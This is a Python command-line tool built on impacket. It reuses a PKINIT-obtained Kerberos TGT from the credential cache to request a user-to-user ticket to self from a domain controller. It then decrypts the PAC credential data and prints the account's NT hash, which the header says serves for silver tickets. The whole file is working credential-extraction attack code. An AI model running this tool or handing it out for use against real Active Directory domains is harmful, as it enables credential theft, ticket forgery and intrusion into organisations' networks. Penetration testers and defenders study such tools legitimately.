#!/usr/bin/env python
# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Author:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema (@_dirkjan)
#
# Description:
#     This script will use an existing TGT to request a PAC for the current user using U2U.
#     When the TGT was obtained using PKINIT, the resulting PAC will contain the NT hash which can be
#     used for silver tickets and for backwards compatibility with other tooling.
#
# References:
#
#     U2U: https://tools.ietf.org/html/draft-ietf-cat-user2user-02
from __future__ import division
from __future__ import print_function
import argparse
import datetime
import logging
import random
import re
import os
import struct
import sys
from binascii import unhexlify, hexlify
from six import b

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from impacket import version
from impacket.krb5.ccache import CCache

from impacket.dcerpc.v5.rpcrt import TypeSerialization1
from impacket.examples import logger
from impacket.examples.utils import parse_credentials
from impacket.krb5 import constants
from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, \
    EncTicketPart, AD_IF_RELEVANT, Ticket as TicketAsn1
from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5, Enctype
from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
from impacket.krb5.pac import PACTYPE, PAC_INFO_BUFFER, KERB_VALIDATION_INFO, PAC_CLIENT_INFO_TYPE, PAC_CLIENT_INFO, \
    PAC_SERVER_CHECKSUM, PAC_SIGNATURE_DATA, PAC_PRIVSVR_CHECKSUM, PAC_UPN_DNS_INFO, UPN_DNS_INFO, PAC_CREDENTIAL_INFO, \
    PAC_CREDENTIAL_DATA, SECPKG_SUPPLEMENTAL_CRED, NTLM_SUPPLEMENTAL_CREDENTIAL
from impacket.krb5.types import Principal, KerberosTime, Ticket
from impacket.winregistry import hexdump


class GETPAC(object):

    def printPac(self, data, key=None):
        encTicketPart = decoder.decode(data, asn1Spec=EncTicketPart())[0]
        adIfRelevant = decoder.decode(encTicketPart['authorization-data'][0]['ad-data'], asn1Spec=AD_IF_RELEVANT())[
            0]
        # So here we have the PAC
        pacType = PACTYPE(adIfRelevant[0]['ad-data'].asOctets())
        buff = pacType['Buffers']
        found = False
        for bufferN in range(pacType['cBuffers']):
            infoBuffer = PAC_INFO_BUFFER(buff)
            data = pacType['Buffers'][infoBuffer['Offset']-8:][:infoBuffer['cbBufferSize']]
            if logging.getLogger().level == logging.DEBUG:
                print("TYPE 0x%x" % infoBuffer['ulType'])
            if infoBuffer['ulType'] == 2:
                found = True
                credinfo = PAC_CREDENTIAL_INFO(data)
                if logging.getLogger().level == logging.DEBUG:
                    credinfo.dump()
                newCipher = _enctype_table[credinfo['EncryptionType']]
                out = newCipher.decrypt(key, 16, credinfo['SerializedData'])
                type1 = TypeSerialization1(out)
                # I'm skipping here 4 bytes with its the ReferentID for the pointer
                newdata = out[len(type1)+4:]
                pcc = PAC_CREDENTIAL_DATA(newdata)
                if logging.getLogger().level == logging.DEBUG:
                    pcc.dump()
                for cred in pcc['Credentials']:
                    credstruct = NTLM_SUPPLEMENTAL_CREDENTIAL(b''.join(cred['Credentials']))
                    if logging.getLogger().level == logging.DEBUG:
                        credstruct.dump()

                    print('Recovered NT Hash')
                    print(hexlify(credstruct['NtPassword']).decode('utf-8'))

            buff = buff[len(infoBuffer):]

        if not found:
            logging.info('Did not find the PAC_CREDENTIAL_INFO in the PAC. Are you sure your TGT originated from a PKINIT operation?')
    def __init__(self, username, domain, options):
        self.__username = username
        self.__domain = domain.upper()
        self.__kdcHost = options.dc_ip
        self.__asrep_key = options.key

    def dump(self):
        # Try all requested protocols until one works.

        # Do we have a TGT cached?
        tgt = None
        try:
            ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
            logging.debug("Using Kerberos Cache: %s" % os.getenv('KRB5CCNAME'))
            principal = 'krbtgt/%s@%s' % (self.__domain.upper(), self.__domain.upper())
            creds = ccache.getCredential(principal)
            if creds is not None:
                # ToDo: Check this TGT belogns to the right principal
                TGT = creds.toTGT()
                tgt, cipher, sessionKey = TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey']
                oldSessionKey = sessionKey
                logging.info('Using TGT from cache')
            else:
                logging.debug("No valid credentials found in cache. ")
        except:
            logging.critical('No TGT found from ccache, did you set the KRB5CCNAME environment variable?')

        decodedTGT = decoder.decode(tgt, asn1Spec = AS_REP())[0]

        # Extract the ticket from the TGT
        ticket = Ticket()
        ticket.from_asn1(decodedTGT['ticket'])

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] =  constants.encodeFlags(opts)
        seq_set(apReq,'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])

        clientName = Principal()
        clientName.from_asn1( decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.utcnow()
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('AUTHENTICATOR')
            print(authenticator.prettyPrint())
            print ('\n')

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq = TGS_REQ()

        tgsReq['pvno'] =  5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        opts.append( constants.KDCOptions.forwardable.value )
        opts.append( constants.KDCOptions.renewable.value )
        opts.append( constants.KDCOptions.canonicalize.value )
        opts.append(constants.KDCOptions.enc_tkt_in_skey.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)

        serverName = Principal(self.__username, type=constants.PrincipalNameType.NT_UNKNOWN.value)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        reqBody['realm'] = str(decodedTGT['crealm'])

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                      (int(cipher.enctype),int(constants.EncryptionTypes.rc4_hmac.value)))

        myTicket = ticket.to_asn1(TicketAsn1())
        seq_set_iter(reqBody, 'additional-tickets', (myTicket,))
        if logging.getLogger().level == logging.DEBUG:
            logging.debug('Final TGS')
            print(tgsReq.prettyPrint())
        if logging.getLogger().level == logging.DEBUG:
            logging.debug('Final TGS')
            print(tgsReq.prettyPrint())

        message = encoder.encode(tgsReq)
        logging.info('Requesting ticket to self with PAC')

        r = sendReceive(message, self.__domain, self.__kdcHost)

        tgs = decoder.decode(r, asn1Spec = TGS_REP())[0]

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('TGS_REP')
            print(tgs.prettyPrint())

        cipherText = tgs['ticket']['enc-part']['cipher']

        # Key Usage 2
        # AS-REP Ticket and TGS-REP Ticket (includes tgs session key or
        #  application session key), encrypted with the service key
        #  (section 5.4.2)

        newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]



        try:
            # If is was plain U2U, this is the key
            plainText = newCipher.decrypt(key, 2, str(cipherText))
        except:
            # S4USelf + U2U uses this other key
            plainText = cipher.decrypt(sessionKey, 2, cipherText)
        specialkey = Key(18, unhexlify(self.__asrep_key))
        self.printPac(plainText, specialkey)

# Process command-line arguments.
if __name__ == '__main__':
    logger.init()
    print(version.BANNER)

    parser = argparse.ArgumentParser()

    parser.add_argument('identity', action='store', help='domain/username')
    parser.add_argument('-key', action='store', required=True, help='AS REP key from gettgtpkinit.py')
    parser.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    domain, username, password = parse_credentials(options.identity)


    if domain is None:
        logging.critical('Domain should be specified!')
        sys.exit(1)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    try:
        dumper = GETPAC(username, domain, options)
        dumper.dump()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(str(e))
